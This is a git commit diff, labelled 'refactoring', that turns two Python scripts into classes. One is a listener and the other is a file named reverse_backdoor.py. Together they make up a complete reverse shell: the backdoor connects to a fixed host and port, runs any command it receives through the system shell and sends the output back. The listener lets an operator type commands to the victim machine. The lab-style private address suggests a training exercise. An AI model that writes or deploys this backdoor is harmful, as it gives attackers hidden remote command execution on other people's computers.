9d76d82f566bd1d91252af85003ee43dc926d7da
Shahtr1 <tramboos123@gmail.com>
2021-01-28 10:24:10 -0500

    refactoring

--- listener.py
+++ listener.py
@@ -1,10 +1,28 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # modifying sockets for reusing sockets, 1 to enable
-# these options
-listener.bind(("10.0.2.15", 4444))
-listener.listen(0)  # backlog in the method, 0 backlogs
-print("[+] Waiting for incoming connections")
-listener.accept()
-print("[+] Got a connection")
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
+                            1)  # modifying sockets for reusing sockets, 1 to enable
+        # these options
+        listener.bind((ip, port))
+        listener.listen(0)  # backlog in the method, 0 backlogs
+        print("[+] Waiting for incoming connections")
+        self.connection, self.address = listener.accept()
+        print("[+] Got a connection from " + str(self.address))
+
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+
+myListener = Listener("10.0.2.15", 4444)
+myListener.run()
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,18 +1,23 @@
 import socket
 import subprocess
 
-def execute_system_command(command):
-	return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.15", 4444))
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.connection.recv(1024)
+            command_result = self.execute_system_command(command)
+            self.connection.send(command_result)
+
+        connection.close()
 
 
-# connection.send("\n[+] Connection has been established.\n")
-
-while True:
-	command = connection.recv(1024)
-	command_result = execute_system_command(command)
-	connection.send(command_result)
-
-connection.close()
+myBackdoor = Backdoor("10.0.2.15", 4444)
+myBackdoor.run()
